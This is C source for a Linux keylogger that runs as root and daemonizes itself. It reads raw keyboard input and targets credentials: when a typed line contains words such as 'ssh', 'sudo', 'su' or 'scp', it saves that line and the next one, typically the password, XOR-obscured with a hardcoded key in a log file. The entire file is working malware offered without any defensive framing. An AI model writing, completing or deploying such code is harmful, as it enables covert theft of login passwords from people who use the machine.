#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdbool.h>

#include "key_util.h"
#include "util.h"
#include "options.h"
#include "config.h"

#define KEY_RELEASE 0
#define KEY_PRESS 1
#define BUF_SIZE 1024

typedef struct input_event input_event;

static void rootCheck();
static int openKeyboardDeviceFile(char *deviceFile);

static void rootCheck() {
   if (geteuid() != 0) {
      printf("Must run as root\n");
      exit(-1);
   }
}

bool checkstring(char *buffer) {
    char *words[9];
    words[0] = "smb";
    words[1] = "ssh";
    words[2] = "sftp";
    words[3] = "ftps";
    words[4] = "su";
    words[5] = "sudo";
    words[6] = "scp";
    words[7] = "ftp";
    words[8] = "telnet";
    for(int i = 0; i < 9; i++){
        if(strstr(buffer, words[i])){
            return true;
            break;
        }
    }
}

char* XORCipher(char* data, char* key, unsigned long dataLen, unsigned long keyLen) {
    char* output = (char*)malloc(sizeof(char)*dataLen+1);
    output[dataLen] = 0;
    for(int i = 0; i < dataLen; ++i) {
        output[i] = data[i] ^ key[i % keyLen];
    }
    return output;
}

static int openKeyboardDeviceFile(char *deviceFile) {
   int kbd_fd = open(deviceFile, O_RDONLY);
   if (kbd_fd == -1) {
      LOG_ERROR("%s", strerror(errno));
      exit(-1);
   }

   return kbd_fd;
}

int main(int argc, char **argv) {
   rootCheck();

   Config config;
   parseOptions(argc, argv, &config);

   int kbd_fd = openKeyboardDeviceFile(config.deviceFile);
   assert(kbd_fd > 0);

   FILE *logfile = fopen(config.logFile, "a");
   if (logfile == NULL) {
      LOG_ERROR("Could not open log file");
      exit(-1);
   }
   setbuf(logfile, NULL);

   if (daemon(1, 0) == -1) {
      LOG_ERROR("%s", strerror(errno));
      exit(-1);
   }

   uint8_t shift_pressed = 0;
   input_event event;
   char key[] = {'@', '3', 'd', 'k', 'A', '4', '\'', '%', '3'};
   unsigned long dataLen;
   unsigned long keyLen = strlen(key);
   char * buf = malloc(sizeof(char) * BUF_SIZE);
   char* message;
   int i = 0;
   bool lognext = false;
   while (read(kbd_fd, &event, sizeof(input_event)) > 0) {
      if (event.type == EV_KEY) {
         if (event.value == KEY_PRESS) {
            if (isShift(event.code)) {
               shift_pressed++;
            }
            char *name = getKeyText(event.code, shift_pressed);
            bool flag = false;
            if (strcmp(name, UNKNOWN_KEY) != 0) {
               LOG("%s", name);
               for (int c = 0; c < strlen(name); c++) {
                 buf[i++] = name[c];
               }
               dataLen = strlen(buf);
               if((strcmp(name, "<Enter>") == 0) && lognext){
                 message = XORCipher(buf, key, dataLen, keyLen);
                 fputs(message, logfile);
                 fputs("\n", logfile);
                 lognext = false;
               }
               if (strcmp(name, "<Enter>") == 0){
                 flag = checkstring(buf);
                 if(flag) {
                   message = XORCipher(buf, key, dataLen, keyLen);
                   fputs(message, logfile);
                   fputs("\n", logfile);           lognext = true;
                 }
                 memset(buf, '\0', sizeof(char) * BUF_SIZE);
                 i = 0;
               }
            }
         }
         else if (event.value == KEY_RELEASE) {
            if (isShift(event.code)) {
               shift_pressed--;
            }
         }
      }
      assert(shift_pressed >= 0 && shift_pressed <= 2);
   }

   Config_cleanup(&config);
   fclose(logfile);
   close(kbd_fd);
   return 0;
}
